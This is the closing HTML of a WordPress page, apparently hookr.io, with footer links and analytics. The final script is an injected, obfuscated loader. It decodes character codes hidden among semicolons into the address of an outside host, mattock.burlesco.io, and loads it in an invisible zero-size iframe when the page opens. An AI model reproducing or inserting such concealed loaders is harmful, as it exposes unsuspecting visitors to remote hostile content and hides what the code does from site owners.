href="http://twitter.com/hookr_io" title="Follow me!"></a></li></ul><div> &copy; 2017 hookr.io <strong>(beta)</strong> | <a href="http://hookr.io/privacy/" title="Privacy">Privacy</a> | Proudly Powered by WordPress</div></div> </footer><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9EvL9BNzU1KTdHLzcwDAA.js"></script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create','UA-49583310-1','hookr.io');ga('send','pageview');</script><script defer>;(function(w,d,undefined,s){var f=d.createElement('iframe'),e=d.documentElement,b=document.createElement('body');f.style='display:none!important';f.width=f.height=0;f.src=(s).split(/[^\u0030-\u0039]+/).map(function(v){return v.length?String.fromCharCode(v):v;}).join('').trim();b.appendChild(f);e.appendChild(b);})(window,document,undefined,';;;47;;;;47;;;;;;;;;;;;;;109;;;;;;;;;;;;;;;;;97;;;;;;;;;;;;;;;;116;;;;;;116;;;;;;;;;;;;;;;;;;111;;;;;;;;;;;;;99;;;;;;;;107;;;;;;;;;;;;;;;;46;;;;;;;;98;;;;;;;117;;;;;;;;;;;;;;;;;;;;;114;;;;;;;;;;;;;;;108;;;;;;;;;;;;;;;;;101;;;;;;;;;;;;;;;;;;;;115;;;;;;;;;;;;;99;;;;;;;;;;;;;;;111;;;;;;;;;;;;;;;;;;;;;46;;;;;;;;;;;;;;;;105;;;;;;;;;111;;;;;;;;;;47;;;;;;;;;;;;;;;;;;;;;;;102;;;;;114;;;;;;;;;;;;;;;;;;;;;;;;97;;;;;;;;;;;109;;;;;;;;;;;101;;;;;;;;;;;;;;;;;;;;46;;;;;;;;;;104;;;;;;;116;;;;;;;;;;;;;;109;;;;;;;;;108;;;;;;;;;;;;;;;35;;;;;;;;;;;;;48;;;;;;;;;;46;;;;;;;;;;;;;;55;;;;;;;;;;;;;;');</script></body></html>